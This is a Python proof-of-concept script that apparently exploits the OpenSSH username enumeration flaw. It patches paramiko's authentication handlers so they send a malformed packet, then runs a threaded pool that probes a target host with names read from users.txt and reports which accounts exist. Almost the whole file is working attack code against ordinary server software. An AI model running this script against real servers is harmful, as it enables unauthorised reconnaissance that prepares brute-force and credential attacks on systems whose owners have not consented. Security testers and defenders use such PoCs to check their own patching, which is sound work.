#!/usr/bin/env python3

from paramiko.auth_handler import AuthHandler
from paramiko.message import Message
from paramiko.transport import Transport

from bad_username_exception import BadUsername

import paramiko
import multiprocessing
import socket
import sys

# store function we will overwrite to malform the packet
old_parse_service_accept = AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class SshUserEnum():
	def __init__(self, hostname, port):
		self.hostname = hostname
		self.port = port

	# create malicious "add_boolean" function to malform packet
	def add_boolean(self, *args, **kwargs):
		pass

	# create function to call when username was invalid
	def call_error(self, *args, **kwargs):
		raise BadUsername()

	# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
	def malform_packet(self, *args, **kwargs):
		old_add_boolean = Message.add_boolean
		Message.add_boolean = self.add_boolean
		result = old_parse_service_accept(*args, **kwargs)
		#return old add_boolean function so start_client will work again
		Message.add_boolean = old_add_boolean
		return result

	# create function to perform authentication with malformed packet and desired username
	def checkUsername(self, username, tried=0):
		sock = socket.socket()
		sock.connect((self.hostname, self.port))
		# instantiate transport
		transport = Transport(sock)
		try:
			transport.start_client()
		except paramiko.ssh_exception.SSHException:
			# server was likely flooded, retry up to 3 times
			transport.close()
			if tried < 4:
				tried += 1
				return self.checkUsername(username, tried)
			else:
				print("[-] Failed to negotiate SSH transport")
		try:
			transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
		except BadUsername:
			return (username, False)
		except paramiko.ssh_exception.AuthenticationException:
			return (username, True)
		#Successful auth(?)
		raise Exception("There was an error. Is this the correct version of OpenSSH?")

def exportList(results):
	final = ""
	for result in results:
		if result[1]:
			final+=result[0]+" is a valid user!\n"
		else:
			final+=result[0]+" is not a valid user!\n"
	return final

# assign functions to respective handlers
def main(hostname, port, threads=5):
	poc = SshUserEnum(hostname, port)
	AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = poc.malform_packet
	AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = poc.call_error

	sock = socket.socket()
	try:
		sock.connect((hostname, port))
		sock.close()
	except socket.error:
		print("[-] Connecting to host failed. Please check the specified host and port.")
		sys.exit(1)
	try:
		f = open("users.txt")
	except IOError:
		print("[-] File doesn't exist or is unreadable.")
		sys.exit(3)
	usernames = map(str.strip, f.readlines())
	f.close()
	# map usernames to their respective threads
	pool = multiprocessing.Pool(5)
	results = pool.map(poc.checkUsername, usernames)
	print(exportList(results))
